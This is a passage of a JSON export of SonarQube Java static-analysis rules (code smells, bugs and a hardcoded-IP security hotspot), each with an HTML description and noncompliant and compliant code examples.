comments","tags":["bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not\nhave experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint myNumber = 010; // Noncompliant. myNumber will hold 8, not 10 - was this really expected?\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nint myNumber = 8;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/atYxBQ\">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a decimal\n  value </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/7DZGBQ\">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1314","summary":"Octal values should not be used","tags":["cert","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Todayâs services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attackâs impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> Itâs a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Donât hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nString ip = \"192.168.12.42\"; // Sensitive\nSocket socket = new Socket(ip, 6667);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString ip = System.getenv(\"IP_ADDRESS\"); // Compliant\nSocket socket = new Socket(ip, 6667);\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"https://en.wikipedia.org/wiki/Object_identifier\">often\n  match Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/OjdGBQ\">CERT, MSC03-J.</a> - Never hard code sensitive information </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1313","summary":"Using hardcoded IP addresses is security-sensitive","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Regardless of the logging framework in use (logback, log4j, commons-logging, java.util.logging, â¦â), loggers should be:</p>\n<ul>\n  <li> <code>private</code>: never be accessible outside of its parent class. If another class needs to log something, it should instantiate its own\n  logger. </li>\n  <li> <code>static</code>: not be dependent on an instance of a class (an object). When logging something, contextual information can of course be\n  provided in the messages but the logger should be created at class level to prevent creating a logger along with each object. </li>\n  <li> <code>final</code>: be created once and only once per class. </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<p>With a default regular expression of <code>LOG(?:GER)?</code>:</p>\n<pre>\npublic Logger logger = LoggerFactory.getLogger(Foo.class);  // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nprivate static final Logger LOGGER = LoggerFactory.getLogger(Foo.class);\n</pre>\n<h3>Exceptions</h3>\n<p>Variables of type <code>org.apache.maven.plugin.logging.Log</code> are ignored.</p>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1312","summary":"Loggers should be \"private static final\" and should share a naming convention","tags":["convention","logging"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>This rule allows you to track the use of the PMD suppression comment mechanism.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n// NOPMD\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1310","summary":"Track uses of \"NOPMD\" suppression comments ","tags":["bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a\nsuitable comment as to why no action is taken.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nswitch (param) {  //missing default clause\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n\nswitch (param) {\n  default: // default clause should be the last one\n    error();\n    break;\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nswitch (param) {\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n  default:\n    error();\n    break;\n}\n</pre>\n<h3>Exceptions</h3>\n<p>If the <code>switch</code> parameter is an <code>Enum</code> and if all the constants of this enum are used in the <code>case</code> statements,\nthen no <code>default</code> clause is expected.</p>\n<p>Example:</p>\n<pre>\npublic enum Day {\n    SUNDAY, MONDAY\n}\n...\nswitch(day) {\n  case SUNDAY:\n    doSomething();\n    break;\n  case MONDAY:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/478\">CWE-478 - Missing Default Case in Switch Statement</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/RtYxBQ\">CERT, MSC01-C.</a> - Strive for logical completeness </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-131","summary":"\"switch\" statements should have \"default\" clauses","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<h2>Why is this an issue?</h2>\n<p>This rule allows you to track the usage of the <code>@SuppressWarnings</code> mechanism.</p>\n<h3>Noncompliant code example</h3>\n<p>With a parameter value of \"unused\" :</p>\n<pre>\n@SuppressWarnings(\"unused\")\n@SuppressWarnings(\"unchecked\")  // Noncompliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1309","summary":"Track uses of \"@SuppressWarnings\" annotations","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>\n<p>For just one or two cases, however, the code will be more readable with <code>if</code> statements.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nswitch (variable) {\n  case 0:\n    doSomething();\n    break;\n  default:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nif (variable == 0) {\n  doSomething();\n} else {\n  doSomethingElse();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1301","summary":"\"switch\" statements should have at least 3 \"case\" clauses","tags":["bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Any issue to quality rule can be deactivated with the <code>NOSONAR</code> marker. This marker is pretty useful to exclude false-positive results\nbut it can also be used abusively to hide real quality flaws.</p>\n<p>This rule raises an issue when <code>NOSONAR</code> is used.</p>\n\n","impacts":[],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1291","summary":"Track uses of \"NOSONAR\" comments","tags":["bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While\nthis is sometimes intentional, it often is a mistake which leads to unexpected behavior.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nswitch (myVariable) {\n  case 1:\n    foo();\n    break;\n  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?\n    doSomething();\n  default:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nswitch (myVariable) {\n  case 1:\n    foo();\n    break;\n  case 2:\n    doSomething();\n    break;\n  default:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h3>Exceptions</h3>\n<p>This rule is relaxed in the following cases:</p>\n<pre>\nswitch (myVariable) {\n  case 0:                                // Empty case used to specify the same behavior for a group of cases.\n  case 1:\n    doSomething();\n    break;\n  case 2:                                // Use of a fallthrough comment\n    // fallthrough\n  case 3:                                // Use of return statement\n    return;\n  case 4:                                // Use of throw statement\n    throw new IllegalStateException();\n  case 5:                                // Use of continue statement\n    continue;\n  default:                               // For the last case, use of break statement is optional\n    doSomethingElse();\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/484\">CWE-484 - Omitted Break Statement in Switch</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ldYxBQ\">CERT, MSC17-C.</a> - Finish every set of statements associated with a case label with a\n  break statement </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/1DdGBQ\">CERT, MSC52-J.</a> - Finish every set of statements associated with a case label with a\n  break statement </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-128","summary":"Switch cases should end with an unconditional \"break\" statement","tags":["cwe","cert","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A <code>for</code> loop termination condition should test the loop counter against an invariant value that does not change during the execution of\nthe loop. Invariant termination conditions make the program logic easier to understand and maintain.</p>\n<p>This rule tracks three types of non-invariant termination conditions:</p>\n<ul>\n  <li> When the loop counters are updated in the body of the <code>for</code> loop </li>\n  <li> When the termination condition depends on a method call </li>\n  <li> When the termination condition depends on an object property since such properties could change during the execution of the loop. </li>\n</ul>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Make the termination condition invariant by using a constant or a local variable instead of an expression that could change during the execution of\nthe loop.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfor (int i = 0; i &lt; foo(); i++) { // Noncompliant, \"foo()\" is not an invariant\n  // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nint end = foo();\nfor (int i = 0; i &lt; end; i++) { // Compliant, \"end\" does not change during loop execution\n  // ...\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>If this is impossible and the counter variable must be updated in the loopâs body, use a <code>while</code> or <code>do</code> <code>while</code>\nloop instead of a <code>for</code> loop.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nfor (int i = 0; i &lt; 10; i++) {\n  // ...\n  if (condition) i++; // Noncompliant, i is updated from within body\n  // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nint i = 0;\nwhile (i++ &lt; 10) { // Compliant\n  // ...\n  if (condition) sum++;\n  // ...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-127","summary":"\"for\" loop stop conditions should be invariant","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>A <code>for</code> loop is a type of loop construct that allows a block of code to be executed repeatedly for a fixed number of times. The\n<code>for</code> loop is typically used when the number of iterations is known in advance and consists of three parts:</p>\n<ul>\n  <li> The initialization statement is executed once at the beginning of the loop. It is used to initialize the loop counter or any other variables\n  that may be used in the loop. </li>\n  <li> The loop condition is evaluated at the beginning of each iteration, and if it is <code>true</code>, the code inside the loop is executed. </li>\n  <li> The update statement is executed at the end of each iteration and is used to update the loop counter or any other variables that may be used in\n  the loop. </li>\n</ul>\n<pre>\nfor (initialization; termination; increment) { /*...*/ }\n</pre>\n<p>All three statements are optional. However, when the initialization and update statements are not used, it can be unclear to the reader what the\nloop counter is and how it is being updated. This can make the code harder to understand and maintain.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfor (;condition;) { /*...*/ } // Noncompliant; only the condition is specified\n</pre>\n<p>When only the condition expression is defined in a <code>for</code> loop, a <code>while</code> loop should be used instead to increase readability.\nA <code>while</code> loop consists of a single loop condition and allows a block of code to be executed repeatedly as long as the specified condition\nis true.</p>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nwhile (condition) { /*...*/ }\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/nutsandbolts/for.html\">Java SE - The for Statement</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1264","summary":"A \"while\" loop should be used instead of a \"for\" loop","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>\nshould be followed by an <code>else</code> statement.</p>\n<p>The requirement for a final <code>else</code> statement is defensive programming.</p>\n<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is\nconsistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif (x == 0) {\n  doSomething();\n} else if (x == 1) {\n  doSomethingElse();\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nif (x == 0) {\n  doSomething();\n} else if (x == 1) {\n  doSomethingElse();\n} else {\n  throw new IllegalStateException();\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/RtYxBQ\">CERT, MSC01-C.</a> - Strive for logical completeness </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/jzZGBQ\">CERT, MSC57-J.</a> - Strive for logical completeness </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-126","summary":"\"if ... else if\" constructs should end with \"else\" clauses","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Non-abstract classes and enums with non-<code>static</code>, <code>private</code> members should explicitly initialize those members, either in a\nconstructor or with a default value.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nclass A { // Noncompliant\n  private int field;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nclass A {\n  private int field;\n\n  A(int field) {\n    this.field = field;\n  }\n}\n</pre>\n<h3>Exceptions</h3>\n<ul>\n  <li> Class implementing a Builder Pattern (name ending with \"Builder\"). </li>\n  <li> <a href=\"https://docs.oracle.com/javaee/7/tutorial/index.html\">Java EE</a> class annotated with:\n    <ul>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/annotation/ManagedBean.html\">ManagedBean</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/MessageDriven.html\">MessageDriven</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/Singleton.html\">Singleton</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/Stateful.html\">Stateful</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/Stateless.html\">Stateless</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/jws/WebService.html\">WebService</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/servlet/annotation/WebFilter.html\">WebFilter</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/servlet/annotation/WebServlet.html\">WebServlet</a> </li>\n    </ul>  </li>\n  <li> Class and field annotated with:\n    <ul>\n      <li> <a href=\"https://codehaus-plexus.github.io/plexus-containers/plexus-component-annotations/index.html\">Plexus Component Annotations</a>\n      </li>\n      <li> <a href=\"https://maven.apache.org/developers/mojo-api-specification.html\">Maven Mojo</a> </li>\n    </ul>  </li>\n  <li> Field annotated with:\n    <ul>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/annotation/Resource.html\">Resource</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/EJB.html\">EJB</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/inject/Inject.html\">Inject</a> </li>\n      <li> <a\n      href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/annotation/Autowired.html\">Autowired</a> </li>\n    </ul>  </li>\n  <li> Class annotated with:\n    <ul>\n      <li> <a href=\"https://www.javadoc.io/doc/org.projectlombok/lombok/latest/lombok/Builder.html\">Lombok Builder</a> </li>\n    </ul>  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1258","summary":"Classes and enums with private members should have a constructor","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Commented-out code distracts the focus from the actual executed code. It creates a noise that increases maintenance code. And because it is never\nexecuted, it quickly becomes out of date and invalid.</p>\n<p>Commented-out code should be deleted and can be retrieved from source control history if required.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-125","summary":"Sections of code should not be commented out","tags":["unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Floating point math is imprecise because of the challenges of storing such values in a binary representation. Even worse, floating point math is\nnot associative; push a <code>float</code> or a <code>double</code> through a series of simple mathematical operations and the answer will be\ndifferent based on the order of those operation because of the rounding that takes place at each step.</p>\n<p>Even simple floating point assignments are not simple:</p>\n<pre>\nfloat f = 0.1; // 0.100000001490116119384765625\ndouble d = 0.1; // 0.1000000000000000055511151231257827021181583404541015625\n</pre>\n<p>(Results will vary based on compiler and compiler settings);</p>\n<p>Therefore, the use of the equality (<code>==</code>) and inequality (<code>!=</code>) operators on <code>float</code> or <code>double</code> values\nis almost always an error. Instead the best course is to avoid floating point comparisons altogether. When that is not possible, you should consider\nusing one of Javaâs float-handling <code>Numbers</code> such as <code>BigDecimal</code> which can properly handle floating point comparisons. A third\noption is to look not for equality but for whether the value is close enough. I.e. compare the absolute value of the difference between the stored\nvalue and the expected value against a margin of acceptable error. Note that this does not cover all cases (<code>NaN</code> and <code>Infinity</code>\nfor instance).</p>\n<p>This rule checks for the use of direct and indirect equality/inequailty tests on floats and doubles.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nfloat myNumber = 3.146;\nif ( myNumber == 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be false\n  // ...\n}\nif ( myNumber != 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be true\n  // ...\n}\n\nif (myNumber &lt; 4 || myNumber &gt; 4) { // Noncompliant; indirect inequality test\n  // ...\n}\n\nfloat zeroFloat = 0.0f;\nif (zeroFloat == 0) {  // Noncompliant. Computations may end up with a value close but not equal to zero.\n}\n</pre>\n<h3>Exceptions</h3>\n<p>Since <code>NaN</code> is not equal to itself, the specific case of testing a floating point value against itself is a valid test for\n<code>NaN</code> and is therefore ignored. Though using <code>Double.isNaN</code> method should be preferred instead, as intent is more explicit.</p>\n<pre>\nfloat f;\ndouble d;\nif(f != f) { // Compliant; test for NaN value\n  System.out.println(\"f is NaN\");\n} else if (f != d) { // Noncompliant\n  // ...\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1244","summary":"Floating point numbers should not be tested for equality","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>This rule template can be used to create rules which will be triggered when the full content of a comment matches a given regular expression. Note\nthat the regular expression should be expressed using the dotall format (where the <code>.</code> character matches any character).</p>\n<p>For example, one can create a rule with the regular expression <code>.*REVIEW.*</code> to match all comment containing \"REVIEW\".</p>\n<p>Note that, in order to match REVIEW regardless of the case, the <code>(?i)</code> modifier should be prepended to the expression, as in\n<code>(?i).*REVIEW.*</code>.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-124","summary":"Track comments matching a regular expression","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Each package in a Java project should include a <code>package-info.java</code> file. The purpose of this file is to document the Java package using\njavadoc and declare package annotations.</p>\n<h3>Compliant solution</h3>\n<pre>\n/**\n* This package has non null parameters and is documented.\n**/\n@ParametersAreNonnullByDefault\npackage org.foo.bar;\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1228","summary":"Packages should have a javadoc file 'package-info.java'","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>While it is technically correct to assign to parameters from within method bodies, doing so before the parameter value is read is likely a bug.\nInstead, initial values of parameters, caught exceptions, and foreach parameters should be, if not treated as <code>final</code>, then at least read\nbefore reassignment.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void doTheThing(String str, int i, List&lt;String&gt; strings) {\n  str = Integer.toString(i); // Noncompliant\n\n  for (String s : strings) {\n    s = \"hello world\"; // Noncompliant\n  }\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1226","summary":"Method parameters, caught exceptions and foreach variables' initial values should not be ignored","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Having a class and some of its methods sharing the same name is misleading, and leaves others to wonder whether it was done that way on purpose, or\nwas the methods supposed to be a constructor.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Foo {\n   public Foo() {...}\n   public void Foo(String label) {...}  // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Foo {\n   public Foo() {...}\n   public void foo(String label) {...}  // Compliant\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1223","summary":"Non-constructor methods should not have the same name as the enclosing class","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Due to the similar name with the methods <code>Object.toString</code>, <code>Object.hashCode</code> and <code>Object.equals</code>, there is a\nsignificant likelihood that a developer intended to override one of these methods but made a spelling error.</p>\n<p>Even if no such error exists and the naming was done on purpose, these method names can be misleading. Readers might not notice the difference, or\nif they do, they may falsely assume that the developer made a mistake.</p>\n<h2>How to fix it</h2>\n<p>If you intended to override one of the methods <code>Object.toString</code>, <code>Object.hashCode</code>, or <code>Object.equals</code>, correct\nthe spelling. Also, you should add the <code>@Override</code> modifier, which causes a compiler error message in case the annotated method does not\noverride anything.</p>\n<p>If the naming was done on purpose, you should rename the methods to be more distinctive.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre>\npublic int hashcode() { /* ... */ }             // Noncompliant\n\npublic String tostring() { /* ... */ }          // Noncompliant\n\npublic boolean equal(Object obj) { /* ... */ }  // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre>\n@Override\npublic int hashCode() { /* ... */ }             // Compliant\n\n@Override\npublic String toString() { /* ... */ }          // Compliant\n\n@Override\npublic boolean equals(Object 